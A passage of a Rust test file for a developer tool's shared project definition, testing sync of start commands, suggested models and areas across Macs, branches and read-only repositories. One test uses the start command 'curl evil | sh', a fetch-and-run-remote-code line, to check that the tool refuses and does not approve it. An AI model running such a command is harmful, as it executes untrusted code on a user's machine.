    let change = report.changes.iter().find(|c| c.field == "tryCommand").expect("a change of tryCommand");
    assert_eq!(change.label, "Start command");
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().try_command.as_deref(), Some("npm run dev"));
    let worktree = crate::worktree_setup::load_settings(&fx.configs, &fx.ws_id);
    assert_eq!(worktree.approved_try, None, "the refresh never allows");
    assert!(!worktree.try_allowed(Some("npm run dev")));
    // Nothing else of the project part moved.
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().install_script.as_deref(),
        Some("scripts/install-local.sh")
    );

    // This Mac changes it: applied at once, and queued for the branch.
    crate::project_config::set_try_command(&fx.configs, &fx.ws_id, Some("npm start".into())).unwrap();
    let view = record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
    assert_eq!(view.cache.pending.get("tryCommand"), Some(&serde_json::json!("npm start")));
    assert!(view.queue.fields.contains_key("tryCommand"));
    assert_eq!(view.cache.pending.len(), 1, "{:?}", view.cache.pending);
    // A refresh while it waits keeps this Mac's value.
    fx.refresh(&repo);
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().try_command.as_deref(), Some("npm start"));
    // The branch carrying it settles it.
    repo.put("main", DEFINITION_PATH, &with("npm start"), "me", "c3");
    let report = fx.refresh(&repo);
    assert!(report.pending_fields.is_empty(), "{:?}", report.pending_fields);
}

/// A definition that shares no build settings leaves this Mac's start
/// command alone, and a change of it here stays this Mac's.
#[test]
fn without_shared_build_settings_the_start_command_stays_on_this_mac() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    fx.configs
        .set(&fx.ws_id, crate::project_config::detect_with_branch(Path::new("/nonexistent"), "main".into(), "test").config)
        .unwrap();
    crate::project_config::set_try_command(&fx.configs, &fx.ws_id, Some("bin/rails server".into())).unwrap();
    repo.put("main", DEFINITION_PATH, r#"{ "name": "Shared", "board": "local" }"#, "someone", "c1");
    fx.refresh(&repo);
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().try_command.as_deref(), Some("bin/rails server"));
    crate::project_config::set_try_command(&fx.configs, &fx.ws_id, Some("python manage.py runserver".into())).unwrap();
    let view = record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
    assert!(!view.cache.pending.contains_key("tryCommand"), "{:?}", view.cache.pending);
}

/// Pinned: `tryCommand` is a project field but not a project of its own — a
/// definition holding only it (and the identity) shares no build settings,
/// so a refresh applies no project part of defaults over this Mac's config.
#[test]
fn a_definition_with_only_a_start_command_is_not_a_project_definition() {
    let only = parse_definition(br#"{ "name": "Shared", "board": "local", "tryCommand": "npm run dev" }"#).unwrap();
    assert_eq!(only.try_command.as_deref(), Some("npm run dev"));
    assert!(!only.has_project());
    assert!(!only.normalized("main").has_project());
    assert!(PROJECT_FIELDS.contains(&"tryCommand"));

    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let mut cfg = crate::project_config::detect_with_branch(Path::new("/nonexistent"), "develop".into(), "test").config;
    cfg.install_script = Some("scripts/go.sh".into());
    fx.configs.set(&fx.ws_id, cfg).unwrap();
    repo.put(
        "main",
        DEFINITION_PATH,
        r#"{ "name": "Shared", "board": "local", "tryCommand": "npm run dev" }"#,
        "someone",
        "c1",
    );
    fx.refresh(&repo);
    let local = fx.configs.get(&fx.ws_id).unwrap();
    assert_eq!(local.target_branch, "develop", "no project part applied");
    assert_eq!(local.install_script.as_deref(), Some("scripts/go.sh"));
    assert_eq!(local.try_command, None, "and its start command alone is not applied");
}

/// The real channel: on a read-only repository the save is put back and
/// refused, and this Mac records no approval for it.
#[test]
fn a_read_only_repository_refuses_a_start_command_and_approves_nothing() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "matteo", "c1");
    *repo.permission.borrow_mut() = Some(false);
    fx.refresh(&repo);
    assert!(fx.cache().unwrap().write_access.read_only());
    let err = crate::project_config::save_try_command(&fx.configs, &fx.ws_id, Some("curl evil | sh".into()), |edit| {
        edit()?;
        record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).map(|_| ())
    })
    .unwrap_err();
    assert!(err.contains("ask for write access"), "{err}");
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().try_command, None, "put back");
    assert_eq!(crate::worktree_setup::load_settings(&fx.configs, &fx.ws_id).approved_try, None);
}

/// Challenger round 2: a start command kept without a config (no build
/// settings here yet) survives the repository gaining build settings that
/// name none — the first config takes it over and it is queued for the
/// branch as this Mac's edit, not deleted in silence.
#[test]
fn a_kept_start_command_survives_the_first_shared_build_settings_and_is_queued() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, r#"{ "name": "Shared", "board": "local" }"#, "someone", "c1");
    fx.refresh(&repo);
    assert!(fx.configs.get(&fx.ws_id).is_none());
    crate::project_config::set_try_command(&fx.configs, &fx.ws_id, Some("npm run dev".into())).unwrap();
    assert!(fx.configs.get(&fx.ws_id).is_none(), "kept without a config");

    // A teammate publishes build settings without a start command.
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "teammate", "c2");
    let report = fx.refresh(&repo);
    let cfg = fx.configs.get(&fx.ws_id).expect("the first config");
    assert_eq!(cfg.try_command.as_deref(), Some("npm run dev"), "taken over, not dropped");
    assert_eq!(cfg.install_script.as_deref(), Some("scripts/install-local.sh"));
    assert_eq!(fx.configs.try_command(&fx.ws_id).as_deref(), Some("npm run dev"));
    assert!(report.changes.iter().all(|c| c.field != "tryCommand"), "{:?}", report.changes);
    assert_eq!(fx.cache().unwrap().pending.get("tryCommand"), Some(&serde_json::json!("npm run dev")));
    assert!(fx.queue().fields.contains_key("tryCommand"), "queued for the branch");

    // The next refresh keeps it; the branch carrying it settles it.
    fx.refresh(&repo);
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().try_command.as_deref(), Some("npm run dev"));
    repo.put(
        "main",
        DEFINITION_PATH,
        &PLY_DEFINITION.replace("\"verifyPipeline\"", "\"tryCommand\": \"npm run dev\",\n  \"verifyPipeline\""),
        "me",
        "c3",
    );
    let report = fx.refresh(&repo);
    assert!(report.pending_fields.is_empty(), "{:?}", report.pending_fields);
}

/// The repository's own start command wins over one kept here.
#[test]
fn the_repositorys_start_command_wins_over_one_kept_without_a_config() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    crate::project_config::set_try_command(&fx.configs, &fx.ws_id, Some("npm run dev".into())).unwrap();
    repo.put(
        "main",
        DEFINITION_PATH,
        &PLY_DEFINITION.replace("\"verifyPipeline\"", "\"tryCommand\": \"bin/dev\",\n  \"verifyPipeline\""),
        "teammate",
        "c1",
    );
    let report = fx.refresh(&repo);
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().try_command.as_deref(), Some("bin/dev"));
    assert!(report.changes.iter().any(|c| c.field == "tryCommand"));
    assert!(!fx.cache().unwrap().pending.contains_key("tryCommand"));
}

/// Challenger round 3: on a read-only Mac the kept start command can't be
/// published, so the repository's "none" stands on that same refresh: the
/// kept command and its approval go, the change is said at once, and it
/// can't run.
#[test]
fn a_read_only_mac_drops_a_kept_start_command_at_once_and_says_so() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    *repo.permission.borrow_mut() = Some(false);
    crate::project_config::save_try_command(&fx.configs, &fx.ws_id, Some("npm run dev".into()), |edit| edit()).unwrap();
    assert!(crate::worktree_setup::load_settings(&fx.configs, &fx.ws_id).try_allowed(Some("npm run dev")));

    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "teammate", "c1");
    let report = fx.refresh(&repo);
    assert!(report.read_only);
    let change = report.changes.iter().find(|c| c.field == "tryCommand").expect("the drop is said");
    assert_eq!(change.value, Value::Null);
    assert_eq!(change.label, "Start command");
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().try_command, None, "not taken over");
    assert_eq!(fx.configs.try_command(&fx.ws_id), None);
    assert!(!fx.configs.workspace_dir(&fx.ws_id).join("try_command.json").exists());
    let worktree = crate::worktree_setup::load_settings(&fx.configs, &fx.ws_id);
    assert_eq!(worktree.approved_try, None, "its approval goes too");
    assert!(!worktree.try_allowed(Some("npm run dev")), "it can't run");
    assert!(!fx.cache().unwrap().pending.contains_key("tryCommand"));
    assert!(!fx.queue().fields.contains_key("tryCommand"));

    // The next refresh has nothing more to say about it.
    let report = fx.refresh(&repo);
    assert!(report.changes.iter().all(|c| c.field != "tryCommand"), "{:?}", report.changes);
}

/// A taken-over start command whose publish fails stays pending and queued
/// across the refresh that follows, and keeps working here.
#[test]
fn a_pending_start_command_survives_a_failed_publish_and_a_refresh() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    crate::project_config::set_try_command(&fx.configs, &fx.ws_id, Some("npm run dev".into())).unwrap();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "teammate", "c1");
    fx.refresh(&repo);
    assert!(fx.queue().fields.contains_key("tryCommand"));

    let publisher = FakePublisher::default().then(PublishOutcome::Unreachable("could not resolve host github.com".into()));
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    assert!(report.error.is_some());
    assert!(publisher.requests.borrow()[0].1.contains_key("tryCommand"), "it was what the publish carried");
    assert_eq!(fx.cache().unwrap().pending.get("tryCommand"), Some(&serde_json::json!("npm run dev")));

    let report = fx.refresh(&repo);
    assert!(report.pending_fields.contains(&"tryCommand".to_string()), "{:?}", report.pending_fields);
    assert!(report.changes.iter().all(|c| c.field != "tryCommand"), "{:?}", report.changes);
    assert!(fx.queue().fields.contains_key("tryCommand"));
    assert_eq!(fx.configs.get(&fx.ws_id).unwrap().try_command.as_deref(), Some("npm run dev"));
}

// ── 1.169.0 (A2): `models`, the team's suggested models ────────────────

/// Tier 2: a definition without `models` — every one written before A2 —
/// loads and suggests nothing; a `models` of the wrong type reads as none
/// and never makes the definition unreadable; an older Plyloft keeps the
/// key as an unknown one.
#[test]
fn a2_a_definition_without_models_loads_and_suggests_nothing() {
    let def = parse_definition(PLY_DEFINITION.as_bytes()).unwrap();
    assert!(def.models.is_none());
    let mut suggested = def.clone();
    suggested.models = Some(Default::default());
    assert_eq!(def.normalized("main"), suggested.normalized("main"));
    let odd = PLY_DEFINITION.replace("\"installScript\"", "\"models\": \"opus\",\n  \"installScript\"");
    let def = parse_definition(odd.as_bytes()).expect("still readable");
    assert_eq!(def.models.unwrap_or_default().rows(), crate::settings::RoleModels::default());
    // What an older Plyloft sees: an unknown key, kept as it is.
    let with = PLY_DEFINITION.replace(
        "\"installScript\"",
        "\"models\": { \"codex\": { \"builder\": \"gpt-6-astra\" } },\n  \"installScript\"",
    );
    #[derive(serde::Deserialize)]
    struct Older {
        #[serde(flatten)]
        extra: BTreeMap<String, Value>,
    }
    let older: Older = serde_json::from_str(&with).unwrap();
    assert_eq!(older.extra["models"]["codex"]["builder"], "gpt-6-astra");
}

/// The repository's suggestions reach this Mac's `team_models.json` on a
/// refresh, with a toast naming the field; a local edit is queued for the
/// branch and the file a publish writes keeps `models`' other keys.
#[test]
fn a2_team_models_travel_with_the_definition() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let with = |text: &str| PLY_DEFINITION.replace("\"installScript\"", &format!("\"models\": {text},\n  \"installScript\""));
    repo.put(
        "main",
        DEFINITION_PATH,
        &with(r#"{ "codex": { "builder": "gpt-6-astra", "builderReasoning": "high" }, "later": 1 }"#),
        "matteo",
        "c1",
    );
    let report = fx.refresh(&repo);
    let change = report.changes.iter().find(|c| c.field == "models").expect("a change of models");
    assert_eq!(change.label, "Suggested models and effort");
    let team = crate::team_models::load(&fx.configs, &fx.ws_id);
    assert_eq!(team.rows().codex.builder.as_deref(), Some("gpt-6-astra"));
    assert!(fx.refresh(&repo).changes.iter().all(|c| c.field != "models"), "nothing new: no change");

    // This Mac suggests Claude's Builder effort: applied at once and queued.
    let mut next = team.clone();
    next.claude.builder_reasoning = Some("xhigh".into());
    crate::team_models::save(&fx.configs, &fx.ws_id, &next).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    let queued = &fx.queue().fields["models"];
    assert_eq!(queued.value["claude"]["builderReasoning"], "xhigh");
    assert_eq!(queued.value["later"], 1, "unknown keys kept");
    let cache = fx.cache().unwrap();
    let fields: BTreeMap<String, Value> = [("models".to_string(), queued.value.clone())].into_iter().collect();
    let text = file_text(cache.definition.as_ref().unwrap(), None, &fields, "main");
    let written = parse_definition(text.as_bytes()).unwrap().models.unwrap();
    assert_eq!(written.extra.get("later"), Some(&serde_json::json!(1)), "{text}");
    assert_eq!(written.rows().codex.builder.as_deref(), Some("gpt-6-astra"));

    // Another Mac takes the repository's newer value.
    let other = Fixture::new();
    repo.put("main", DEFINITION_PATH, &with(r#"{ "claude": { "challenger": "claude-sonnet-5-5" } }"#), "ana", "c2");
    other.refresh(&repo);
    assert_eq!(
        crate::team_models::load(&other.configs, &other.ws_id).rows().claude.challenger.as_deref(),
        Some("claude-sonnet-5-5")
    );
}

/// Challenger 1: an edit from Settings sends `models` with the keys it
/// doesn't know, and they survive — at the top and inside a vendor — into
/// this Mac's store and the queued value; clearing everything queues null.
#[test]
fn a2_a_settings_edit_keeps_unknown_keys_and_clearing_removes_the_key() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let raw = r#"{ "codex": { "builder": "gpt-6-astra", "future": 2 }, "later": 1 }"#;
    repo.put("main", DEFINITION_PATH, &PLY_DEFINITION.replace("\"installScript\"", &format!("\"models\": {raw},\n  \"installScript\"")), "matteo", "c1");
    fx.refresh(&repo);
    let base: Map<String, Value> = [("models".to_string(), serde_json::from_str(raw).unwrap())].into_iter().collect();
    let edited = r#"{ "codex": { "builder": "gpt-6-astra", "builderReasoning": "xhigh", "future": 2 }, "later": 1 }"#;
    let draft: Map<String, Value> = [("models".to_string(), serde_json::from_str(edited).unwrap())].into_iter().collect();
    save_changes(&fx.stores(), &repo, &fx.ws_id, base.clone(), draft.clone()).unwrap();
    let stored = serde_json::to_value(crate::team_models::load(&fx.configs, &fx.ws_id)).unwrap();
    assert_eq!(stored["later"], 1);
    assert_eq!(stored["codex"]["future"], 2);
    assert_eq!(stored["codex"]["builderReasoning"], "xhigh");
    let queued = &fx.queue().fields["models"];
    assert_eq!(queued.value["later"], 1);
    assert_eq!(queued.value["codex"]["future"], 2);
    // Every suggestion cleared (unknown keys too): the key itself goes.
    let cleared: Map<String, Value> = [("models".to_string(), Value::Null)].into_iter().collect();
    save_changes(&fx.stores(), &repo, &fx.ws_id, draft, cleared).unwrap();
    assert_eq!(fx.queue().fields["models"].value, Value::Null);
}

// ── 1.170.0 walk fix: two clones of one repository ────────────────────

/// Walk 2026-10-27 (Windows): two folders, two clones of one GitHub
/// repository, on two branches — `walk-1170` and `walk-1170-rel`, each with
/// a definition naming itself, none on the default branch. Both workspaces
/// took the newer branch's ("Shared from walk-1170-rel", its name, cards
/// started from it). Each now reads its own folder's branch.
#[test]
fn two_clones_of_one_repository_on_two_branches_each_read_their_own() {
    let dir = tempfile::tempdir().unwrap();
    let run = |cwd: &std::path::Path, args: &[&str]| {
        let out = crate::platform::git_command()
            .args(args)
            .current_dir(cwd)
            .env("GIT_AUTHOR_NAME", "t")
            .env("GIT_AUTHOR_EMAIL", "t@example.com")
            .env("GIT_COMMITTER_NAME", "t")
            .env("GIT_COMMITTER_EMAIL", "t@example.com")
            .output()
            .unwrap();
        assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    };
    let origin = dir.path().join("origin.git");
    let seed = dir.path().join("seed");
    std::fs::create_dir_all(&seed).unwrap();
    run(dir.path(), &["init", "-q", "--bare", "-b", "main", origin.to_str().unwrap()]);
    run(&seed, &["init", "-q", "-b", "main"]);
    std::fs::write(seed.join("README.md"), "sandbox\n").unwrap();
    run(&seed, &["add", "."]);
    run(&seed, &["commit", "-q", "-m", "first"]);
    run(&seed, &["remote", "add", "origin", origin.to_str().unwrap()]);
    run(&seed, &["push", "-q", "origin", "main"]);
    std::fs::create_dir_all(seed.join(".atelier")).unwrap();
    for (branch, name, at) in [("walk-1170", "d1170", "1700000000"), ("walk-1170-rel", "d1170-rel", "1700000100")] {
        run(&seed, &["checkout", "-q", "-b", branch, "main"]);
        std::fs::create_dir_all(seed.join(".atelier")).unwrap();
        std::fs::write(
            seed.join(DEFINITION_PATH),
            format!(r#"{{ "schemaVersion": 1, "name": "{name}", "board": "local", "integrationBranch": "{branch}" }}"#),
        )
        .unwrap();
        run(&seed, &["add", "."]);
        let out = crate::platform::git_command()
            .args(["commit", "-q", "-m", name])
            .current_dir(&seed)
            .env("GIT_AUTHOR_NAME", "t")
            .env("GIT_AUTHOR_EMAIL", "t@example.com")
            .env("GIT_COMMITTER_NAME", "t")
            .env("GIT_COMMITTER_EMAIL", "t@example.com")
            .env("GIT_COMMITTER_DATE", format!("{at} +0000"))
            .env("GIT_AUTHOR_DATE", format!("{at} +0000"))
            .output()
            .unwrap();
        assert!(out.status.success());
        run(&seed, &["push", "-q", "origin", branch]);
    }
    let config = dir.path().join("config");
    let workspaces = WorkspaceStore::new(config.clone()).unwrap();
    let configs = ProjectConfigStore::new(config).unwrap();
    let stores = Stores { workspaces: &workspaces, project_configs: &configs, github_board_allowed: true };
    let mut ids = Vec::new();
    for (folder, branch) in [("n170", "walk-1170"), ("n170-rel", "walk-1170-rel")] {
        let clone = dir.path().join(folder);
        run(dir.path(), &["clone", "-q", "-b", branch, origin.to_str().unwrap(), clone.to_str().unwrap()]);
        let ws = workspaces.create(folder.to_string(), clone.to_string_lossy().to_string()).unwrap();
        ids.push((ws.id, clone, branch));
    }
    // The newer branch's definition comes first in a scan by date.
    let first = GitRepo { cwd: ids[0].1.clone() };
    assert_eq!(first.branches_with(DEFINITION_PATH)[0], "walk-1170-rel");
    assert_eq!(first.current_branch().as_deref(), Some("walk-1170"));
    for (id, clone, branch) in &ids {
        let repo = GitRepo { cwd: clone.clone() };
        refresh_with(&stores, &repo, id, RefreshMoment::Open).unwrap();
        let cache = load_cache(&configs, id).unwrap();
        assert_eq!(cache.branch.as_deref(), Some(*branch), "{clone:?} reads its own branch");
        let def = cache.definition.unwrap();
        assert_eq!(def.integration_branch.as_deref(), Some(*branch));
        assert_eq!(configs.get(id).unwrap().target_branch, *branch, "cards start from its own branch");
    }
    let names: Vec<String> = workspaces.snapshot().workspaces.into_iter().map(|w| w.name).collect();
    assert_eq!(names, ["d1170", "d1170-rel"], "each takes its own branch's name");

    // 1.171.0 (X2), walk #1: a third clone on a branch with no definition
    // takes neither silently — it is set up on its own and the board asks
    // about the newest one found.
    run(&seed, &["checkout", "-q", "-b", "walk-ux-1171", "main"]);
    run(&seed, &["push", "-q", "origin", "walk-ux-1171"]);
    let clone = dir.path().join("my-notes-app");
    run(dir.path(), &["clone", "-q", "-b", "walk-ux-1171", origin.to_str().unwrap(), clone.to_str().unwrap()]);
    let ws = workspaces.create("my-notes-app".to_string(), clone.to_string_lossy().to_string()).unwrap();
    let repo = GitRepo { cwd: clone.clone() };
    let report = refresh_with(&stores, &repo, &ws.id, RefreshMoment::Open).unwrap();
    assert!(!report.has_definition, "{report:?}");
    let cache = load_cache(&configs, &ws.id).unwrap();
    assert!(cache.definition.is_none());
    let found = cache.found_elsewhere.expect("asked about");
    assert_eq!((found.branch.as_str(), found.name.as_str(), found.here.as_deref()), ("walk-1170-rel", "d1170-rel", Some("walk-ux-1171")));
    assert!(configs.get(&ws.id).is_none(), "cards don't start from another branch");
    let name = workspaces.snapshot().workspaces.into_iter().find(|w| w.id == ws.id).unwrap().name;
    assert_eq!(name, "my-notes-app");
    assert!(!repo.built_on("walk-1170-rel") && !repo.built_on("main"));

    // Challenger 2: a branch made from walk-1170 (this Mac's own, not on
    // origin) was built on it — walk-1170 is its team's branch, adopted
    // without a question; walk-1170-rel is still somebody else's.
    run(&clone, &["checkout", "-q", "-b", "feat-notes", "origin/walk-1170"]);
    assert!(repo.built_on("walk-1170") && !repo.built_on("walk-1170-rel"));
    let report = refresh_with(&stores, &repo, &ws.id, RefreshMoment::Open).unwrap();
    assert!(report.has_definition, "{report:?}");
    assert_eq!(report.branch.as_deref(), Some("walk-1170"));
    assert!(load_cache(&configs, &ws.id).unwrap().found_elsewhere.is_none());
}

#[test]
fn the_scan_puts_the_folders_own_branch_first() {
    let b = |v: &[&str]| v.iter().map(|s| s.to_string()).collect::<Vec<_>>();
    assert_eq!(own_branch_first(b(&["rel", "walk", "x"]), Some("walk")), b(&["walk", "rel", "x"]));
    assert_eq!(own_branch_first(b(&["rel", "walk"]), Some("other")), b(&["rel", "walk"]));
    assert_eq!(own_branch_first(b(&["rel", "walk"]), None), b(&["rel", "walk"]));
}

// ── 1.173.0 (B1): `areas` ──────────────────────────────────────────────

/// Tier 2 (v1.11.x template): a definition written before areas — every one
/// so far — loads with none, and a repository without them is untouched: no
/// `areas.json` on this Mac, and the file a publish of another field writes
/// is, byte for byte, the one it wrote before areas existed.
#[test]
fn b1_a_definition_without_areas_loads_and_resaves_without_an_areas_key() {
    let def = parse_definition(PLY_DEFINITION.as_bytes()).unwrap();
    assert!(def.areas.is_none());
    assert!(def.normalized("main").areas.is_none());
    let mut empty = def.clone();
    empty.areas = Some(Vec::new().into());
    assert_eq!(def.normalized("main"), empty.normalized("main"), "an empty list is none");

    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "a", "c1");
    let report = fx.refresh(&repo);
    assert!(report.changes.iter().all(|c| c.field != "areas"), "{:?}", report.changes);
    assert!(!fx.configs.workspace_dir(&fx.ws_id).join("areas.json").exists(), "nothing written");
    assert!(crate::areas::view(&fx.configs, &fx.ws_id, "").areas.is_empty(), "the implicit area");
    assert!(fx.cache().unwrap().field_problems.is_empty());
    assert!(!std::fs::read_to_string(cache_path(&fx.configs, &fx.ws_id)).unwrap().contains("fieldProblems"));

    // A rename publishes the name alone: the bytes 1.172 wrote.
    fx.workspaces.rename(&fx.ws_id, "Renamed".into()).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    assert_eq!(fx.queue().fields.keys().collect::<Vec<_>>(), vec!["name"]);
    let cache = fx.cache().unwrap();
    let fields: BTreeMap<String, Value> =
        [("name".to_string(), Value::from("Renamed"))].into_iter().collect();
    let text = file_text(cache.definition.as_ref().unwrap(), None, &fields, "main");
    assert_eq!(
        text,
        r##"{
  "schemaVersion": 1,
  "name": "Renamed",
  "accentColor": "#7c3aed",
  "board": "githubIssues",
  "githubOwnerRepo": "MatteoB-adv/atelier",
  "versionFiles": [
    {
      "path": "package.json",
      "kind": "package_json"
    },
    {
      "path": "src-tauri/Cargo.toml",
      "kind": "cargo_toml"
    }
  ],
  "installScript": "scripts/install-local.sh",
  "verifyPipeline": [
    {
      "kind": "script",
      "path": "scripts/ppvp.sh"
    }
  ]
}
"##
    );
    // The definition this Mac runs with carries none either.
    let view = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap();
    assert!(view.effective.unwrap().areas.is_none());
}

/// The repository's areas reach this Mac's `areas.json` on a refresh, with a
/// toast naming the field; an edit here is applied at once, queued for the
/// branch and written into the file a publish makes.
#[test]
fn b1_areas_travel_with_the_definition() {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, &with_areas(TWO_AREAS), "matteo", "c1");
    let report = fx.refresh(&repo);
    let change = report.changes.iter().find(|c| c.field == "areas").expect("a change of areas");
    assert_eq!(change.label, "Areas");
    assert_eq!(change.previous, Value::Null, "none before");
    let areas = crate::areas::load(&fx.configs, &fx.ws_id);
    assert_eq!(areas.iter().map(|a| a.id.as_str()).collect::<Vec<_>>(), vec!["app", "site"]);
    assert_eq!(areas[0].path, "", "\"/\" is the root");
    assert!(fx.refresh(&repo).changes.iter().all(|c| c.field != "areas"), "nothing new: no change");
    // What B3/B4 read: the site's branch and files, the app's branch.
    let site = crate::project_config::config_for(&fx.configs, &fx.ws_id, Some("site")).unwrap();
    assert_eq!(site.config().unwrap().target_branch, "main");
    assert_eq!(site.config().unwrap().version_files[0].path, "lyrappc-astro/package.json");
    assert_eq!(site.tag_prefix(), Some("site-"));
    let app = crate::project_config::config_for(&fx.configs, &fx.ws_id, Some("app")).unwrap();
    assert_eq!((app.config().unwrap().target_branch.as_str(), app.tag_prefix()), ("staging", Some("")));
    assert_eq!(app.config().unwrap().version_files, fx.configs.get(&fx.ws_id).unwrap().version_files);

    // The site's address, edited in Settings: applied and queued.
    let base = to_map(&get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap());
    let mut draft = base.clone();
    draft["areas"][1]["lookAt"] = Value::from("https://www.lyrappc.com");
    save_changes(&fx.stores(), &repo, &fx.ws_id, base, draft).unwrap();
    let stored = crate::areas::load(&fx.configs, &fx.ws_id);
    assert_eq!(stored[1].look_at.as_deref(), Some("https://www.lyrappc.com"));
    let queued = &fx.queue().fields["areas"];
    assert_eq!(queued.value[1]["lookAt"], "https://www.lyrappc.com");
    let cache = fx.cache().unwrap();
    let fields: BTreeMap<String, Value> =
        [("areas".to_string(), queued.value.clone())].into_iter().collect();
    let text = file_text(cache.definition.as_ref().unwrap(), None, &fields, "main");
    let written = parse_definition(text.as_bytes()).unwrap().areas.unwrap();
    assert_eq!(written.valid().unwrap()[1].look_at.as_deref(), Some("https://www.lyrappc.com"));

    // Another Mac takes the repository's areas; a changed area's toast
    // knows what was there before; removing them all removes the key.
    let other = Fixture::new();
    other.refresh(&repo);
    assert_eq!(crate::areas::load(&other.configs, &other.ws_id).len(), 2);
    repo.put("main", DEFINITION_PATH, &with_areas(&TWO_AREAS.replace("\"main\"", "\"release\"")), "ana", "c2");
    let report = other.refresh(&repo);
    let change = report.changes.iter().find(|c| c.field == "areas").unwrap();
    assert_eq!(
        crate::areas::change_words(&change.previous, &change.value).as_deref(),
        Some("Site changed")
    );
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "ana", "c3");
    let report = other.refresh(&repo);
    assert!(report.changes.iter().any(|c| c.field == "areas"));
    assert!(crate::areas::load(&other.configs, &other.ws_id).is_empty());
}

/// Challenger 1: areas that break the rules hold that field alone. Every
/// other field applies; the problem is recorded and in the Doctor; this Mac
/// keeps its last good areas; a Mac with none is held (no implicit area);
/// a publish of another field leaves the broken list as it is, and a valid
/// replacement publishes and clears the problem. The editor refuses a
/// broken list.
#[test]
fn b1_areas_that_break_the_rules_are_held_and_the_rest_applies() {
    let overlap = r#"[{ "id": "site", "path": "web" }, { "id": "blog", "path": "web/blog" }]"#;
    let def = parse_definition(with_areas(overlap).as_bytes()).expect("still readable");
    assert!(def.areas.as_ref().unwrap().problem().unwrap().contains("overlap"));
    let odd = parse_definition(with_areas("\"site\"").as_bytes()).expect("a wrong type reads too");
    assert!(odd.areas.unwrap().problem().is_some());

    // This Mac had good areas; then a teammate pushes a broken list and a
    // new install script.
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", DEFINITION_PATH, &with_areas(TWO_AREAS), "a", "c1");
    fx.refresh(&repo);
    let broken = with_areas(overlap).replace("scripts/install-local.sh", "scripts/install-new.sh");
    repo.put("main", DEFINITION_PATH, &broken, "b", "c2");
    let report = fx.refresh(&repo);
    assert!(report.unreadable.is_none(), "the definition reads");
    assert!(report.changes.iter().any(|c| c.field == "installScript"), "{:?}", report.changes);
    assert!(report.changes.iter().all(|c| c.field != "areas"), "{:?}", report.changes);
    assert_eq!(
        fx.configs.get(&fx.ws_id).unwrap().install_script.as_deref(),
        Some("scripts/install-new.sh")
    );
    let cache = fx.cache().unwrap();
    assert!(cache.field_problems["areas"].message.contains("overlap"));
    assert_eq!(crate::areas::load(&fx.configs, &fx.ws_id).len(), 2, "the last good areas stay");
    let v = crate::areas::view(&fx.configs, &fx.ws_id, "");
    assert!(v.problem.is_some() && !v.held);
    assert!(matches!(
        crate::project_config::config_for(&fx.configs, &fx.ws_id, Some("site")),
        Some(crate::areas::AreaConfig::Area { .. })
    ));
    let doctor = crate::doctor::shared_definition_status("atelier", &cache, &fx.queue(), &crate::areas::load(&fx.configs, &fx.ws_id)).unwrap();
    assert_eq!((doctor.state, doctor.summary.as_str()), ("kept", "areas can't be used"));
    assert!(doctor.detail.contains("last good areas"), "{}", doctor.detail);
    assert!(doctor.detail.contains("Settings › Project › Areas"), "{}", doctor.detail);
    // Nothing of the broken list is queued, and the effective areas are the kept ones.
    assert!(cache.pending.is_empty() && fx.queue().is_empty());
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap();
    assert!(fx.queue().is_empty(), "no edit: nothing to publish");
    let effective = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap();
    assert_eq!(effective.areas.unwrap().valid().unwrap().len(), 2);

    // A Mac that never had good areas is held: nothing falls back.
    let other = Fixture::new();
    let report = other.refresh(&repo);
    assert!(report.unreadable.is_none());
    let v = crate::areas::view(&other.configs, &other.ws_id, "");
    assert!(v.held && v.areas.is_empty());
    assert!(matches!(
        crate::project_config::config_for(&other.configs, &other.ws_id, None),
        Some(crate::areas::AreaConfig::Held { .. })
    ));
    let doctor = crate::doctor::shared_definition_status("atelier", &other.cache().unwrap(), &other.queue(), &crate::areas::load(&other.configs, &other.ws_id)).unwrap();
    assert_eq!(doctor.state, "held");
    assert!(doctor.detail.contains("No card can start"), "{}", doctor.detail);

    // A rename published over the broken tip leaves its areas as they are.
    let publisher = RepoPublisher(&repo);
    other.workspaces.rename(&other.ws_id, "Renamed".into()).unwrap();
    record_local_edit(&other.stores(), &repo, &other.ws_id, false).unwrap();
    assert_eq!(other.queue().fields.keys().collect::<Vec<_>>(), vec!["name"]);
